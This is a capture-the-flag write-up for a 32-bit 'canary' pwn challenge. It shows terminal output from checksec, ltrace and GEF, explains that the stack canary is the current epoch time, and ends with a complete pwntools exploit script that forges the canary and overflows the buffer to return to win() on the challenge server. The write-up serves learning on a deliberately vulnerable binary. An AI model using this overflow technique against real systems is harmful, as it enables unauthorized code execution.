Let's get started with CANARY: (Please note that in this write up some of the exerpts from the terminal will have long arrows on the rightside pointing at what I am looking at)

First lets run the program:
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
'''
┌──(kali㉿kali)-[~/Hacking/cwe_screener_3.0/pwn/canary]
└─$ ./canary
Can you figure out how to win here?
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
You lose!
                                                                                                                                                                                          
┌──(kali㉿kali)-[~/Hacking/cwe_screener_3.0/pwn/canary]
└─$ ./canary
Can you figure out how to win here?
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
****Stack Smashing Detected!!!****
Exiting now.

'''
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
We can see here that there is input accepted from the user, but then a Stack Smashing alert goes off, alerting us of a canary catching the buffer overflow... as hinted by the title

Let's now look at the files protections using file & checksec.
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
'''
┌──(kali㉿kali)-[~/Hacking/cwe_screener_3.0/pwn/canary]
└─$ file canary
canary: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=0288607cfa429a1829ea8e0b712545b0d5fa32fe, for GNU/Linux 3.2.0, with debug_info, not stripped
                                                                                                                                                                                          
┌──(kali㉿kali)-[~/Hacking/cwe_screener_3.0/pwn/canary]
└─$ checksec canary
[*] '/home/kali/Hacking/cwe_screener_3.0/pwn/canary/canary'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

'''
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
It's important to note that even though it states that no canary is found, that does not mean that there is no canary that exists, it may not have been found in one of the functions.
Aside from that, there are not many mitigations on this binary, but they may not be helpful to us anyways. Let's take a look at the binary.

If we use some static analysis... we see that there is a main(), read_in() and a win()
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
main()
https://github.com/beCe3jed/cwe-screener-10FEB24/blob/main/pwn/canary/screenshots/main.png

read_in()
https://github.com/beCe3jed/cwe-screener-10FEB24/blob/main/pwn/canary/screenshots/read_in.png

win()
https://github.com/beCe3jed/cwe-screener-10FEB24/blob/main/pwn/canary/screenshots/win.png
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
I personally think ghidra has a much better disassembler for this one:
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
ghidra - main()
https://github.com/beCe3jed/cwe-screener-10FEB24/blob/main/pwn/canary/screenshots/ghidra.png

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Our goal is clear. Return execution flow to win(). But in main, we see that the program will exit if the canary gets overwritten, and just finish otherwise.
We clearly need a way to overwrite the canary with itself. Now there is no way for us to leak what the canary will be at runtime, but if we look in ghidra,
we see that the program makes a system call to date %s, which after a quick internet search is the time lapsed in seconds from the epoch. Lets confirm this with ltrace:
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
┌──(kali㉿kali)-[~/Hacking/cwe_screener_3.0/pwn/canary]
└─$ ltrace ./canary 
__libc_start_main(0x8049326, 1, 0xffc3aaa4, 0x8049440 <unfinished ...>
setvbuf(0xf7e1eda0, 0, 2, 0)                                                                                       = 0
puts("Can you figure out how to win he"...Can you figure out how to win here?
)                                                                        = 36
popen("date +%s", "r")                                                                                             = 0x963b1a0
fgets( <no return ...>
--- SIGCHLD (Child exited) ---
<... fgets resumed> "1707957620\n", 12, 0x963b1a0)                                                                 = 0xffc3a9c0
pclose(0x963b1a0)                                                                                                  = 0
strtol(0xffc3a9c0, 0, 10, 0)                                                                                       = 0x65cd5d74
read(0
, "\n", 144)                                                                                                 = 1
You lose!
+++ exited (status 0) +++
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
We can confirm that there is a popen("date +%s", "r") which returns a time as a string that needs to be casted into a long: strtol(0xffc3a9c0, 0, 10, 0).

This is our way to know what the canary is going to be. At runtime, we will need to get the time since epoch in seconds.
                
Thankfully python has a similar function: datetime.now().timestamp()

Lets test it:    test_exploit.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
from pwn import *
from datetime import datetime

context.binary = binary = ELF("./canary")

p = process()
# p = remote("www.cweaccessionsctf.com", 1315)

# the canary in the program is based off of time
current_time = int(datetime.now().timestamp())
print(current_time)

# for debugging
pid = util.proc.pidof(p)[0]
print(f"Pid is: {pid}")
util.proc.wait_for_debugger(pid)


win = p32(0x08049296)

#canary located at [rbp - 0xc] 
canary = p32(current_time)
print(canary)

p.interactive()

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
terminal A
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------                  
┌──(kali㉿kali)-[~/Hacking/cwe_screener_3.0/pwn/canary]
└─$ python3 test_exploit.py
[*] '/home/kali/Hacking/cwe_screener_3.0/pwn/canary/canary'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/kali/Hacking/cwe_screener_3.0/pwn/canary/canary': pid 1973118
1707958470                          <-------------- THIS IS OUR GUESS FOR THE CANARY FROM OUR SCRIPT
Pid is: 1973118
[+] Waiting for debugger: Done
b'\xc6`\xcde'
[*] Switching to interactive mode
Can you figure out how to win here?
$ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
$  
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
terminal B 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
gef➤  search-pattern 1707958470          <-------------------------------------------------------------------- WE SEARCH FOR IT AT RUNTIME AND FIND IT IN THE STACK!!!!!!!
[+] Searching '1707958470' in memory
[+] In '[heap]'(0x979c000-0x97bd000), permission=rw-
  0x979c300 - 0x979c30c  →   "1707958470\n" 
[+] In '[stack]'(0xffb95000-0xffbb6000), permission=rw-
  0xffbb3860 - 0xffbb386c  →   "1707958470\n"      <---------------------------------------------------------------------------- !!!!!!!FOUND!!!!!!

...
             
gef➤  b*read_in+58
Breakpoint 1 at 0x80492ff: file canary.c, line 16.
gef➤  contin
Continuing.

Breakpoint 1, read_in (x=0x65cd60c6) at canary.c:16
16      canary.c: No such file or directory.
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────── registers ────
$eax   : 0x65cd60c6
$ebx   : 0x0804c000  →  0x0804bf0c  →  <_DYNAMIC+0> add DWORD PTR [eax], eax
$ecx   : 0xffbb3810  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$edx   : 0x90      
$esp   : 0xffbb3810  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebp   : 0xffbb3848  →  0x41414141 ("AAAA"?)
$esi   : 0x08049440  →  <__libc_csu_init+0> endbr32 
$edi   : 0xf7f33ba0  →  0x00000000
$eip   : 0x080492ff  →  <read_in+58> cmp DWORD PTR [ebp-0xc], eax
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
────────────────────────────────────────────────────────────────────── stack ────
0xffbb3810│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"    ← $esp
0xffbb3814│+0x0004: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffbb3818│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffbb381c│+0x000c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffbb3820│+0x0010: 0x41414141
0xffbb3824│+0x0014: 0x41414141
0xffbb3828│+0x0018: 0x41414141
0xffbb382c│+0x001c: 0x41414141
───────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x80492f4 <read_in+47>     add    esp, 0x10
    0x80492f7 <read_in+50>     mov    eax, 0x804c040                <------------------------------------------------------------ THIS ADDRESS GETS LOADED FROM MEMORY!!!!
    0x80492fd <read_in+56>     mov    eax, DWORD PTR [eax]
 →  0x80492ff <read_in+58>     cmp    DWORD PTR [ebp-0xc], eax
    0x8049302 <read_in+61>     je     0x8049320 <read_in+91>
    0x8049304 <read_in+63>     sub    esp, 0xc
    0x8049307 <read_in+66>     lea    eax, [ebx-0x1fe8]
    0x804930d <read_in+72>     push   eax
    0x804930e <read_in+73>     call   0x8049110 <puts@plt>
─────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "canary", stopped 0x80492ff in read_in (), reason: BREAKPOINT
───────────────────────────────────────────────────────────── trace ────
[#0] 0x80492ff → read_in(x=0x65cd60c6)
────────────────────────────────────────────────────────────
gef➤  x/6xb $ebp-0xc
0xffbb383c:     0x41    0x41    0x41    0x41    0x41    0x41
gef➤  x/6xb 0x804c040
0x804c040 <global>:     0xc6    0x60    0xcd    0x65    0x00    0x00
gef➤  x/4xb 0x804c040
0x804c040 <global>:     0xc6    0x60    0xcd    0x65               <--------------------------------------------------------------------THIS IS OUR GUESS BUT IN HEX FORMAT!!!
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

So it looks like our canary was correct! It's important that we have the line for the data function placed correctly or else it could be off be a second or two. Make sure to place it
right after the process() (or remote()) call so that the timing of our function call is in sync with the execution of the program.

That was the hard part.

Now the easy part.

We now need to calculate the offset of our input to the stack address so that we can overwrite it with win()

looking back at read_in() we can see that:

our input is located ar         $ebp - 0x38
While the canary is located at  $ebp - 0xc

therefore all that's left to do is to some subtraction and we'll have a payload structured as follows:

payload = padding + canary + padding2 + ebp + win

Note that the canary and our win() function need to be packed into 32 bit.

                  
This is enough for us to generate our exploit:
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
'''
canary: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=0288607cfa429a1829ea8e0b712545b0d5fa32fe, for GNU/Linux 3.2.0, with debug_info, not stripped
                                                                                                                                                                                          
[*] '/home/kali/Hacking/cwe_screener_3.0/pwn/canary/canary'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
'''

from pwn import *
from datetime import datetime

context.binary = binary = ELF("./canary")

# p = process()
p = remote("www.cweaccessionsctf.com", 1315)

# the canary in the program is based off of time
current_time = int(datetime.now().timestamp())
print(current_time)

# for debugging
# pid = util.proc.pidof(p)[0]
# print(f"Pid is: {pid}")
# util.proc.wait_for_debugger(pid)

win = p32(0x08049296)

#canary located at [rbp - 0xc] 
canary = p32(current_time)
print(canary)

# our input is located at 0xffffcf30 aka [rbp - 0x38]
padding = b'A' * (0x38 - 0xc) 
padding2 = b'A' * (0x8)
ebp = b'B' * (0x4)
payload = padding + canary + padding2 + ebp + win

p.sendline(payload)

p.interactive()

